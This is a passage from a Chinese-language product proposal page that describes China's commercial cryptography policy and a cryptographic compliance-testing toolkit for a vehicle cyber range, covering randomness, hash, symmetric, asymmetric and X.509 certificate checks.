。主流软硬件厂商组成了国际互联网工程任务组等组织，从底层硬件到顶层功能服务做出了详细要求，形成了全产业链兼容的协同生态。谷歌、微软等头部企业均具备独立开展密码研究和安全设计的能力，建设了密码分析与量子计算、可信计算等团队，形成了较为完善的对外服务体系。</p><p>1949 年，随着美国数学家、信息论创始人香农《保密系统的通信理论》论文的发表，密码技术逐渐建立起完善的理论基础，成为一门现代意义上的学科。经过 70 余年的不断发展，各国通过密码技术、密码产品、密码服务等，不断增强密码产品产业化能力，形成了包括网络基础资源、信息设施、计算分析、应用服务、网络通道、接入终端、设备控制等在内的全体系平台安全防护体系。</p><p>如何合规、正确、有效、广泛地使用商用密码，充分发挥商用密码在保障我国网络空间安全中的核心技术及基础支撑作用，关乎网络空间安全、更关乎国家安全大局。为做好商用密码应用推广和产业化工作，我国积极布局相关工作，在制度体系建设、关键产品研发、基础服务产业化等方面取得了阶段性成效。2020 年1 月 1 日起《中华人民共和国密码法》正式实施，明确了党管密码的根本原则，要求密码工作坚持总体国家安全观，遵循统一领导、分级负责，创新发展、服务大局，依法管理、保障安全的原则。在商用密码应用推广方面，明确提出“国家鼓励商用密码技术的研究开发、学术交流、成果转化和推广应用，健全统一、开放、竞争、有序的商用密码市场体系，鼓励和促进商用密码产业发展”为商用密码在更多领域、更广范围的产业化应用推广奠定了坚实的制度基础 。</p><p>在技术创新方面，我国已取得一系列高水平、原创性的科技成果。椭圆曲线公钥密码算法SM2、密码杂凑算法 SM3、分组密码算法 SM4、序列密码算法 ZUC、标识密码算法 SM9 等标准相继发布实施，ZUC 算法成为 4G 国际标准，SM2、SM3 和 SM9 算法成为国际标准。在产品供给方面，密码产品不断增多、功能愈发完善，据统计，已有2 000 余款密码产品通过审批，涵盖了密码芯片、密码板卡、密码机、密码系统等多个方面，形成了较为完备的产业链条和服务体系。在制度建设方面，随着商用密码管理制度不断完善，产品检测能力显著提升，商用密码应用安全性评估试点逐步展开，密码相关政策法规的落地与实施得到有力加强，全社会对密码的认可度大幅提升。</p><p>目前，我国商用密码产业化发展进程较快，在技术创新、产品供给、制度建设等方面取得突出进展，但是仍存在以下问题，亟需进一步加大支持力度。</p><p>《中华人民共和国密码法》对推广商用密码应用提出了明确要求，供给侧企业加大技术、产品、服务的研发力度，形成了包括密码芯片、板卡、加密机、系统在内的完整产品链条体系。同时，我国全国信息安全标准化技术委员会、密码行业标准化技术委员会等标准化组织大力开展商用密码标准化工作，以“急用先行、通用先立”为原则，加快推进标准化进程，研制发布与密码算法、技术应用、产品接口、模块检测等相关的国家标准 40 余项，发挥标准引领和规范作用，指导商用密码应用推广工作。但是，我国网络的整体安全防护能力仍然十分脆弱，大量网络数据、网络设备、信息系统处于“裸奔”状态，没有使用密码技术保护，部分数据、设备和系统还存在密码使用不合规的现象，存在巨大的网络安全隐患，相关检查数据显示，有关部门所辖信息系统密码应用比重仍然较低。此外，我国商用密码产业链上下游的供需对接能力亟待进一步加强，产业链上游供给侧与下游需求侧之间存在信息不匹配、消息不透明等问题。供给侧的供给能力和需求侧的实际需求尚未及时有效对接，产业链上下游协同联动、集成适配的能力有待提升。</p><p>《中华人民共和国密码法》明确规定，关键信息基础设施须使用商用密码进行保护，并开展商用密码应用安全性评估。为贯彻落实法律要求，国家密码管理局发布了《商用密码应用安全性评估试点机构目录》，在全国范围遴选了一批优质技术服务资源，支撑商用密码应用安全性评估工作加快实施。虽然国家、地方、行业相继出台了一些规定和配套的制度、要求，但在一些地区和部门并未得到有效实施。部分单位重信息化建设、轻信息安全保护，信息系统密码使用不规范、不正确，在密钥管理、密码系统运行维护等方面存在风险 。目前，亟需建设商用密码监测感知平台，进一步丰富主管部门监管手段，准确地掌握工业和信息化行业商用密码应用情况，并及时分析商用密码应用风险隐患，帮助密码应用企业对照国家标准、行业标准开展密码应用合规性检查评估，强化企业商用密码的管理与运用，提升密码应用风险消减与防范能力，确保密码应用安全合规。</p><p>密码检测测试工具是企事业单位根据信息系统密码使用情况以及业务安全应用开展密码测评工作的一体化专用测试工具，集成定制有专门的密码安全检测功能，为密码检查、测评工作提供专业检查知识和检查方法，并实现对获取数据的关联分析、统计比对、处理流转等功能，提高密码检查、测评工作的标准化、规范化和专业化水平，实现对密码技术、产品在信息系统中或业务应用中使用的有效性、标准符合性进行检测。充分满足企事业单位在密码应用检测方面的需求。</p><h2 id="智能汽车网络靶场密码检测测试工具"><a href="#智能汽车网络靶场密码检测测试工具" class="headerlink" title="智能汽车网络靶场密码检测测试工具"></a>智能汽车网络靶场密码检测测试工具</h2><p>可对安全协议进行检测，对于可识别的协议，系统根据不同的连接进行展示，并将解析到的每条连接的隧道交互过程信息展示给用户。</p><p>对于TLS/SSL 协议，展示的隧道交互过程包括客户端与服务端的握手信息、证书信息等。</p><p>对于 IPSec 协议，展示的隧道交互过程包括主模式、快速模式、安全通信中的数据包相关信息。</p><p>可针对通信双方使用的国密IPSECVPN、SSLVPN、TLCP、SSH、HTTPS、SSL/TLS验证通信数据的安全性。</p><p>密码检测工具包含商用密码应用安全性检测平台、网络传输密码使用检测仪、智能网联V2X密码应用安全检测工具、密码应用漏洞扫描系统等4个组件。</p><h3 id="商用密码应用安全性检测平台"><a href="#商用密码应用安全性检测平台" class="headerlink" title="商用密码应用安全性检测平台"></a>商用密码应用安全性检测平台</h3><h4 id="商用密码应用安全性检测平台方案"><a href="#商用密码应用安全性检测平台方案" class="headerlink" title="商用密码应用安全性检测平台方案"></a>商用密码应用安全性检测平台方案</h4><ol><li>确定检测目标</li></ol><p>明确商用密码应用安全性检测的目标和范围。确定要评估的密码应用程序，例如密码管理器、身份验证系统等。了解密码应用程序的安全要求和规范，以确定测试的重点和覆盖范围。</p><ol><li>收集安全需求和规范</li></ol><p>收集密码应用程序的安全需求文档、规范和设计文档。了解密码应用程序的安全功能要求、安全机制和安全标准等。这些文档将成为评估和测试的重要参考。</p><ol><li>设计评估策略</li></ol><p>制定商用密码应用安全性评估的策略和计划。确定评估的方法和技术，例如静态代码分析、动态漏洞扫描、安全审计等。考虑使用自动化工具和手动审查相结合的方法来提高评估效率和准确性。</p><p>在平台设计中，采用4U机架式设备作为基础，配置USB口两个，网口两个。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/626f22a924cb8f30dab71465590c4586.png"></p><p>4U平台</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/13abb874ddffa1b13ff43cb0d8b5c827.png"></p><p>双网口设计</p><ol><li>确定评估场景</li></ol><p>基于安全需求和规范，确定商用密码应用安全性评估的关键场景和使用情境。考虑不同的攻击场景、威胁模型和安全漏洞类型等。确保评估场景具有多样性和代表性，能够覆盖密码应用程序的各个安全方面。</p><ol><li>执行安全性评估</li></ol><p>根据评估策略和场景，执行商用密码应用安全性评估。使用合适的工具和技术进行评估，发现潜在的安全漏洞和风险。进行代码审查、漏洞扫描、安全配置审计等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析商用密码应用安全性评估结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进密码应用程序的安全功能和机制。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成安全性评估报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>商用密码应用安全性评估是一个持续的过程。建议定期进行安全性评估，以及在密码应用程序有重大更新或变更时进行评估。跟踪安全需求和规范的变化，及时更新评估策略和方法。</p><h5 id="基本参数"><a href="#基本参数" class="headerlink" title="基本参数"></a>基本参数</h5><p>我司为本项目提供的该产品信息如下：</p><p>品牌：联想</p><p>型号：IPC-830-H110</p><p>数量：1套</p><p>指标参数信息如下：</p><ol><li>提供4U机架式设备；</li><li>配置USB接口2个；</li><li>配置网络接口2*10/100/1000M电口。</li></ol><h4 id="随机数检测"><a href="#随机数检测" class="headerlink" title="随机数检测"></a>随机数检测</h4><h5 id="随机数检测方案设计"><a href="#随机数检测方案设计" class="headerlink" title="随机数检测方案设计"></a>随机数检测方案设计</h5><ol><li>确定评估目标</li></ol><p>明确随机数检测的目标和范围。确定要评估的随机数生成算法，例如伪随机数生成器（PRNG）或真随机数生成器（TRNG）。了解随机数的应用场景和安全要求，以确定评估的重点和覆盖范围。</p><ol><li>收集随机数生成算法规范</li></ol><p>收集随机数生成算法的规范和设计文档。了解算法的设计原理、输入输出规范、安全性要求等。这些文档将成为评估和测试的重要参考。</p><ol><li>设计评估策略</li></ol><p>制定随机数检测的策略和计划。确定评估的方法和技术，例如统计分析、频率测试、均匀性测试、相关性测试等。考虑使用公开可用的随机性检测库或工具来辅助评估。</p><p>随机数检测中功能可支持GM/T 0005-2021和NIST SP 800-22 的随机性检测。</p><ol><li>确定评估场景</li></ol><p>基于随机数生成算法的规范和安全要求，确定随机数检测的关键场景和使用情境。考虑不同的输入条件、参数设置和使用方式等。确保评估场景具有多样性和代表性，能够覆盖随机数生成算法的各个安全方面。</p><ol><li>执行随机数检测</li></ol><p>根据评估策略和场景，执行随机数检测。使用合适的工具和技术进行评估，对生成的随机数进行统计分析和测试。进行频率分析、均匀性测试、相关性测试等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析随机数检测结果和问题，识别潜在的随机性缺陷和改进点。根据评估结果进行调整和改进随机数生成算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成随机数检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的随机性问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>随机数检测是一个持续的过程。建议定期进行随机数检测，以及在随机数生成算法有重大更新或变更时进行评估。跟踪随机数生成算法的安全标准和最佳实践，及时更新评估策略和方法。</p><h5 id="产品彩页"><a href="#产品彩页" class="headerlink" title="产品彩页"></a>产品彩页</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cfe9ba6cdfe416a53b3d5e95b20d6007.png"></p><h5 id="随机数检测参数"><a href="#随机数检测参数" class="headerlink" title="随机数检测参数"></a>随机数检测参数</h5><p>随机数检测支持满足GM/T 0005-2021《随机性检测》（15项）和NIST SP 800-22 的随机性检测（15项），为二元序列的随机性检测提供检测支撑和用于测试由基于硬件或软件的加密随机数或伪随机数生成器生成的(任意长)二进制序列的随机性。</p><p>基于GM/T 0005-2021的随机性检测（15项）响应</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/71f46bcf89e9c6c7fa3ff9fac43b9ae7.png"></p><ol><li>单比特频数检测</li><li>块内频数检测</li><li>扑克检测</li><li>重叠子序列检测</li><li>游程总数检测</li><li>游程分布检测</li><li>块内最大1游程检测</li><li>二元推导检测</li><li>自相关检测</li><li>矩阵秩检测</li><li>累加和检测</li><li>近似熵检测</li><li>离散傅里叶变换</li><li>线性复杂度检测</li><li>Maurer通用统计检测</li></ol><p>NIST SP 800-22 的随机性检测支持分组长度和分组数可根据待测数据大小进行调整，支持一级检测（即通过率）和二级检测（p 值分布）和支持改进的Q_value 值检测。</p><p>基于NIST SP 800-22 的随机性检测（15项）响应</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/80adf22140c9403a8c79c1bad9a6e970.png"></p><ol><li>频数（单比特）检测</li><li>块内频数检测</li><li>游程检测</li><li>块内最长1游程检测</li><li>二元矩阵秩检测</li><li>离散傅里叶变换检测</li><li>非重叠模版匹配检测</li><li>重叠模版匹配检测</li><li>线性复杂度检测</li><li>Maurer’s通用统计检测</li><li>序列检测</li><li>近似熵检测</li><li>累加和检测</li><li>随机游走检测</li><li>随机游走变量检测</li></ol><h4 id="杂凑算法检测"><a href="#杂凑算法检测" class="headerlink" title="杂凑算法检测"></a>杂凑算法检测</h4><h5 id="杂凑算法检测方案设计"><a href="#杂凑算法检测方案设计" class="headerlink" title="杂凑算法检测方案设计"></a>杂凑算法检测方案设计</h5><ol><li>确定评估目标</li></ol><p>明确杂凑算法检测的目标和范围。确定要评估的杂凑算法，例如常见的MD5、SHA-1、SHA-256等。了解杂凑算法的应用场景和安全要求，以确定评估的重点和覆盖范围。</p><ol><li>收集杂凑算法规范</li></ol><p>收集杂凑算法的规范和设计文档。了解算法的设计原理、输入输出规范、安全性要求等。这些文档将成为评估和测试的重要参考。</p><ol><li>设计评估策略</li></ol><p>制定杂凑算法检测的策略和计划。确定评估的方法和技术，例如输入数据生成、碰撞检测、安全性分析等。考虑使用公开可用的杂凑算法检测工具或库来辅助评估。</p><p>在杂凑算法中，可以完成MD4、MD5、SHA1、SHA2 系列、SHA3 系列和国密算法 SM3密码杂凑算法的 Hash 与HMAC 功能。</p><ol><li>确定评估场景</li></ol><p>基于杂凑算法的规范和安全要求，确定杂凑算法检测的关键场景和使用情境。考虑不同的输入数据类型、大小和特性等。确保评估场景具有多样性和代表性，能够覆盖杂凑算法的各个安全方面。</p><ol><li>执行杂凑算法检测</li></ol><p>根据评估策略和场景，执行杂凑算法检测。使用合适的工具和技术进行评估，对杂凑算法进行输入数据生成、碰撞检测、安全性分析等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析杂凑算法检测结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进杂凑算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成杂凑算法检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>杂凑算法检测是一个持续的过程。建议定期进行杂凑算法检测，以及在杂凑算法有重大更新或变更时进行评估。跟踪杂凑算法的安全标准和最佳实践，及时更新评估策略和方法。</p><h5 id="产品彩页-1"><a href="#产品彩页-1" class="headerlink" title="产品彩页"></a>产品彩页</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/cff76fddf5e8b59d7fc3ff5bf1a93f66.png"></p><h5 id="杂凑算法检测参数"><a href="#杂凑算法检测参数" class="headerlink" title="杂凑算法检测参数"></a>杂凑算法检测参数</h5><p>杂凑算法支持实现 MD4、MD5、SHA1、SHA2 系列、SHA3 系列和国密算法 SM3密码杂凑算法的 Hash 与HMAC 功能。</p><p>功能参数</p><ol><li>支持对文件类型和消息类型不同杂凑算法的检测，支持算法包括MD4、MD5、SHA1、SHA2 系列、SHA3 系列和国密算法 SM3 ；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9bc13f41373bf19917aec192afde33fd.png"></p><ol><li>支持对输出格式的转换，包括二进制、十六进制、BASE64和BASE64URL；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/d6fd344e42169da7c2774a3435b015ce.png"></p><ol><li>支持增加盐值和HMAC密钥计算。</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/eec40cd6149d209840b779b4c05885d5.png"></p><h4 id="对称算法检测"><a href="#对称算法检测" class="headerlink" title="对称算法检测"></a>对称算法检测</h4><h5 id="对称算法检测方案设计"><a href="#对称算法检测方案设计" class="headerlink" title="对称算法检测方案设计"></a>对称算法检测方案设计</h5><ol><li>确定评估目标</li></ol><p>明确对称算法检测的目标和范围。确定要评估的对称加密算法，例如AES、DES、3DES等。了解算法的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集对称算法规范</li></ol><p>收集对称算法的规范和设计文档。深入了解算法的设计原理、输入输出规范、密钥管理等关键方面。这些文档将成为评估和测试的重要依据。</p><ol><li>设计评估策略</li></ol><p>制定对称算法检测的策略和计划。确定评估的方法和技术，例如输入数据生成、密钥生成和管理、安全性分析等。考虑使用公开可用的对称算法检测工具或库来辅助评估。</p><p>在对称算法检测中，可实现DES、3DES、AES 和国密算法 SM4 共 4 种对称密码算法的加解密功能。</p><ol><li>确定评估场景</li></ol><p>基于对称算法的规范和安全要求，确定对称算法检测的关键场景和使用情境。考虑不同的输入数据类型、大小和特性，以及不同的密钥长度、模式和操作模式等。确保评估场景具有多样性和代表性，能够覆盖对称算法的各个安全方面。</p><ol><li>执行对称算法检测</li></ol><p>根据评估策略和场景，执行对称算法检测。使用合适的工具和技术进行评估，对对称算法进行输入数据生成、密钥生成和管理、安全性分析等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析对称算法检测结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进对称算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成对称算法检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>对称算法检测是一个持续的过程。建议定期进行对称算法检测，特别是在对称算法有重大更新或变更时。跟踪对称算法的安全标准和最佳实践，及时更新评估策略和方法。</p><h5 id="产品彩页-2"><a href="#产品彩页-2" class="headerlink" title="产品彩页"></a>产品彩页</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/63dc3c725fb464f504e3dae099115199.png"><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/8d5201cfba5f030653192fc941347bce.png"></p><h5 id="对称算法检测参数"><a href="#对称算法检测参数" class="headerlink" title="对称算法检测参数"></a>对称算法检测参数</h5><p>对称算法检测支持实现 DES、3DES、AES 和国密算法 SM4 共 4 种对称密码算法的加解密功能。</p><p>功能参数如下：</p><ol><li>DES算法检测</li><li>工作模式支持：ECB、CBC、CFB、OFB；</li><li>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bd239335b22b64f684a6b5caab1d968a.png"></p><ol><li>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/94c19b8d79aaaa29d163125f6b7a20c4.png"></p><ol><li>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li><li>支持选择密钥格式：字符串、二进制、十六进制；</li><li>支持增加IV初始化向量；</li><li>支持填充字节显示；</li><li>支持增加自定义密钥检测。</li><li>3DES算法检测</li><li>工作模式支持：ECB、CBC、CFB、OFB；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/381950dbc3f31f0175acffefa9fec83b.png"></p><ol><li>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bd239335b22b64f684a6b5caab1d968a.png"></p><ol><li>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li><li>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li><li>支持密钥选择：2KEY、3KEY；</li><li>支持选择密钥格式：字符串、二进制、十六进制；</li><li>支持增加IV初始化向量；</li><li>支持填充字节显示；</li><li>支持增加多个自定义密钥检测。</li><li>AES算法检测</li><li>工作模式支持：ECB、CBC、CFB、OFB、CTR、GCM、CCM和XTS；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/381950dbc3f31f0175acffefa9fec83b.png"></p><ol><li>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/bd239335b22b64f684a6b5caab1d968a.png"></p><ol><li>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li><li>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/94c19b8d79aaaa29d163125f6b7a20c4.png"></p><ol><li>支持选择密钥格式和长度；</li><li>支持增加IV初始化向量；</li><li>支持填充字节显示；</li><li>支持增加自定义密钥检测。</li><li>SM4国密算法检测</li><li>工作模式支持：ECB、CBC、CFB、OFB和CTR；</li><li>填充模式支持：不填充、P7、ZERO、ISO10126、ISO7816_4和ANSIX923；</li><li>明文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li><li>密文格式支持：字符串、二进制、十六进制、BASE64和BASE64URL；</li><li>支持选择密钥格式：字符串、二进制、十六进制；</li><li>支持增加IV初始化向量；</li><li>支持填充字节显示；</li><li>支持增加自定义密钥检测。</li></ol><h4 id="非对称算法检测"><a href="#非对称算法检测" class="headerlink" title="非对称算法检测"></a>非对称算法检测</h4><h5 id="非对称算法检测方案设计"><a href="#非对称算法检测方案设计" class="headerlink" title="非对称算法检测方案设计"></a>非对称算法检测方案设计</h5><ol><li>确定评估目标</li></ol><p>确定非对称算法检测的目标和范围，例如评估某个具体的非对称加密算法或一组算法。确定评估的重点，例如安全性、性能、可用性等方面。</p><ol><li>收集非对称算法规范和实现</li></ol><p>收集非对称算法的规范和设计文档，了解算法的内部工作原理、输入输出规范、密钥管理等关键方面。获取非对称算法的实现代码或库，并进行代码审计，了解实现细节和潜在的安全问题。</p><ol><li>设计评估策略</li></ol><p>确定评估的方法和技术，例如使用静态分析、动态分析、模糊测试等方法进行评估。确定评估的工具和环境，例如使用开源工具、自研工具或商业工具进行评估。制定评估的指标和标准，例如安全性指标、性能指标、可用性指标等。</p><p>在非对称算法中，可实现国密算法 SM2、SM9、国际算法RSA和ECC 的加密、解密、签名和验签功能。</p><ol><li>确定评估场景</li></ol><p>根据非对称算法的规范和安全要求，确定评估的关键场景和使用情境。考虑不同的输入数据类型、大小和特性，以及不同的密钥长度、模式和操作模式等。确保评估场景具有多样性和代表性，能够覆盖非对称算法的各个安全方面。</p><ol><li>执行非对称算法检测</li></ol><p>根据评估策略和场景，执行非对称算法检测。使用合适的工具和技术进行评估，例如编写测试用例、生成输入数据、执行分析和检测操作等。记录评估的过程、结果和问题，并进行必要的数据收集和日志记录。</p><ol><li>分析和改进</li></ol><p>分析非对称算法检测的结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进非对称算法的实现和参数设置。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成非对称算法检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于开发团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>建议定期进行非对称算法检测，特别是在非对称算法有重大更新或变更时。跟踪非对称算法的安全标准和最佳实践，及时更新评估策略和方法。持续监测非对称算法的安全性和性能，并及时进行必要的修复和改进。</p><h5 id="产品彩页-3"><a href="#产品彩页-3" class="headerlink" title="产品彩页"></a>产品彩页</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/dab559226f25b38eeec88b488a749132.png"></p><h5 id="非对称算法检测参数"><a href="#非对称算法检测参数" class="headerlink" title="非对称算法检测参数"></a>非对称算法检测参数</h5><p>非对称算法支持实现国密算法 SM2、SM9、国际算法RSA和ECC 的加密、解密、签名和验签功能。</p><p>功能参数如下：</p><ol><li>SM2国密算法检测</li><li>支持公钥和私钥导入；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/146735a816c9941d9978de6739d04530.png"></p><ol><li>支持随机生成公私钥；</li><li>支持由私钥生成对应公钥；</li><li>支持验证公私钥匹配；</li><li>支持从证书导入公钥；</li><li>支持导入不同的格式明文；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7c43a1641c029e1a74eac118bf0874b8.png"></p><ol><li>支持基于SM2的加解密和签名验签；</li><li>支持清空密钥信息；</li><li>支持从公钥获取X、Y坐标信息；</li><li>支持从密文获取X1、Y1坐标信息；</li><li>支持验证XY坐标是否在曲线上。</li><li>SM9国密算法检测</li><li>支持生成签名主密钥对；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/3d238614642cb58c32a093186236d84d.png"></p><ol><li>支持生成加密主密钥对；</li><li>支持生成用户私钥；</li><li>支持基于SM9的签名验签；</li><li>支持基于SM9的加密解密；</li><li>支持基于SM9的密钥协商；</li><li>支持基于SM9的密钥封装和解封。</li><li>RSA算法检测</li><li>支持公钥（N、E）和私钥导入；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/6ff37b00e832bd50aa369dfaa587a543.png"></p><ol><li>支持随机生成公私钥；</li><li>支持由私钥生成对应公钥；</li><li>支持验证公私钥匹配；</li><li>支持从证书导入公钥；</li><li>支持导入不同的格式明文；</li><li>支持清空密钥信息。</li></ol><p>（四）ECC算法检测</p><ol><li>支持公钥和私钥导入；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/146735a816c9941d9978de6739d04530.png"></p><ol><li>支持随机生成公私钥；</li><li>支持由私钥生成对应公钥；</li><li>支持验证公私钥匹配；</li><li>支持从证书导入公钥；</li><li>支持导入不同的格式明文；</li><li>支持基于SM2的加解密和签名验签；</li><li>支持清空密钥信息；</li><li>支持从公钥获取X、Y坐标信息；</li><li>支持从密文获取X1、Y1坐标信息；</li><li>支持验证XY坐标是否在曲线上。</li></ol><h4 id="格式转化参数"><a href="#格式转化参数" class="headerlink" title="格式转化参数"></a>格式转化参数</h4><p>格式转换功能支持字符串、二进制、十六进制、Base64和 Base64url五种格式之间相互转换。</p><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/9ac86903390f052a47dd7b70cc6775f7.png"></p><h4 id="X-509数字证书检测"><a href="#X-509数字证书检测" class="headerlink" title="X.509数字证书检测"></a>X.509数字证书检测</h4><h5 id="X-509数字证书检测方案设计"><a href="#X-509数字证书检测方案设计" class="headerlink" title="X.509数字证书检测方案设计"></a>X.509数字证书检测方案设计</h5><ol><li>确定评估目标</li></ol><p>明确X.509数字证书检测的目标和范围。确定要评估的X.509证书类型和使用场景，例如服务器证书、客户端证书、代码签名证书等。了解证书的安全性要求和应用场景，以确定评估的重点和覆盖范围。</p><ol><li>收集X.509证书规范和标准</li></ol><p>收集X.509证书的规范和标准，例如RFC 5280中定义的X.509证书结构和字段。深入了解证书的格式、扩展、签名算法、密钥长度等关键方面。这些文档将成为评估和测试的重要依据。</p><ol><li>设计评估策略</li></ol><p>制定X.509数字证书检测的策略和计划。确定评估的方法和技术，例如证书解析、验证签名、检查证书链等。考虑使用公开可用的证书检测工具或库来辅助评估。</p><p>在证书检测中，可实现证书链验证、ASN.1结构产看、X509证书检测等功能，同时还能完成检测报告的生成和导出。</p><ol><li>确定评估场景</li></ol><p>基于X.509证书的规范和安全要求，确定X.509数字证书检测的关键场景和使用情境。考虑不同的证书类型、证书链的构建方式、证书扩展的使用等。确保评估场景具有多样性和代表性，能够覆盖X.509证书的各个安全方面。</p><ol><li>执行X.509数字证书检测</li></ol><p>根据评估策略和场景，执行X.509数字证书检测。使用合适的工具和技术进行评估，对证书进行解析、验证签名、检查证书链等活动。记录评估结果、问题和建议。</p><ol><li>分析和改进</li></ol><p>分析X.509数字证书检测结果和问题，识别潜在的安全漏洞和改进点。根据评估结果进行调整和改进证书的生成、签发和验证流程。持续改进评估策略和方法，以提高评估效果和准确性。</p><ol><li>提供报告和建议</li></ol><p>根据评估结果，生成X.509数字证书检测报告，并提供相应的建议和推荐措施。报告包括评估的范围、方法、发现的安全问题和建议的解决方案。确保报告清晰明了，便于相关团队理解和采纳。</p><ol><li>持续监测和更新</li></ol><p>X.509数字证书检测是一个持续的过程。建议定期进行X.509数字证书检测，特别是在证书有重大更新或变更时。跟踪X.509证书的安全标准和最佳实践，及时更新评估策略和方法。</p><h5 id="产品彩页-4"><a href="#产品彩页-4" class="headerlink" title="产品彩页"></a>产品彩页</h5><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/7a8d604a10c67708c532783343c255c5.png"></p><h5 id="X-509数字证书检测参数"><a href="#X-509数字证书检测参数" class="headerlink" title="X.509数字证书检测参数"></a>X.509数字证书检测参数</h5><p>X.509数字证书检测根据由国家市场监督管理总局、中国国家标准化管理委员会于 2018 年发布的国家标准GB/T 20518-2018《信息安全技术 公钥基础设施 数字证书格式》进行实现。测评过程涵盖核心内容四项（签名算法、参数、签名值及证书链），及普通内容若干项。</p><p>功能参数如下：</p><ol><li>支持证书链验证；</li></ol><p><img src= "https://i.loli.net/2020/07/14/shCfncNLw9axrt8.gif" data-lazy-src="media/311247b964ca7064a5c48c75b366f099.png"></p><ol><li>支持查看ASN.1结构；</li><li>X509证书检测项包括版本、序列号、签名算法、颁发者、有效期、主体、主体公钥参数、主体公钥值、颁发机构密钥标识符、主体密钥标识符、密钥用法、证书撤销列表分发点、个人身份标识码；</li><li>支持生成和导出检测报告。</li></ol><h3 id="网络传输密码检测仪"><a href="#网络传输密码检测仪" class="headerlink" title="网络传输密码检测仪"></a>网络传输密码检测仪</h3><h4 id="网络传输密码检测仪方案设计"><a href="#网络传输密码检测仪方案设计" 